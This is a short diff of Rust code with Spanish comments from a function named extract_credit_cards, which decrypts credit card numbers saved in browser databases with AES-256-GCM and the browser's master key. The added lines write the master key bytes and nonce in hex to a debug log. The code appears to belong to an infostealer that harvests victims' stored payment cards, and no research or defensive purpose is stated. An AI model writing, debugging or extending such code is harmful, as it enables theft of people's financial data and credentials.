@@ -383,6 +383,14 @@ fn extract_credit_cards(db_path: &PathBuf, browser_name: &str, master_key: Optio
                                 let _ = writeln!(f, "      🔑 Intentando AES-256-GCM con master key...");
                                 let _ = writeln!(f, "      📊 Total bytes encriptados: {}", encrypted_number.len());
                                 let _ = writeln!(f, "      📊 Master key length: {}", key.len());
+                                
+                                // Mostrar primeros bytes de master key (solo para debug)
+                                let _ = write!(f, "      🔑 Master key (primeros 16 bytes): ");
+                                for i in 0..std::cmp::min(16, key.len()) {
+                                    let _ = write!(f, "{:02X} ", key[i]);
+                                }
+                                let _ = writeln!(f, "");
+                                
                                 let _ = writeln!(f, "      📊 Prefix: {:02X} {:02X} {:02X} ({})", 
                                     prefix[0], prefix[1], prefix[2], 
                                     String::from_utf8_lossy(prefix));
@@ -391,6 +399,14 @@ fn extract_credit_cards(db_path: &PathBuf, browser_name: &str, master_key: Optio
                                     let nonce_bytes = &encrypted_number[3..15];
                                     let ciphertext_with_tag = &encrypted_number[15..];
                                     let _ = writeln!(f, "      📊 Nonce length: {} bytes", nonce_bytes.len());
+                                    
+                                    // Mostrar nonce en hex
+                                    let _ = write!(f, "      📊 Nonce (hex): ");
+                                    for i in 0..nonce_bytes.len() {
+                                        let _ = write!(f, "{:02X} ", nonce_bytes[i]);
+                                    }
+                                    let _ = writeln!(f, "");
+                                    
                                     let _ = writeln!(f, "      📊 Ciphertext+Tag length: {} bytes", ciphertext_with_tag.len());
                                     let _ = writeln!(f, "      📊 Expected plaintext: {} bytes", ciphertext_with_tag.len().saturating_sub(16));
                                 }
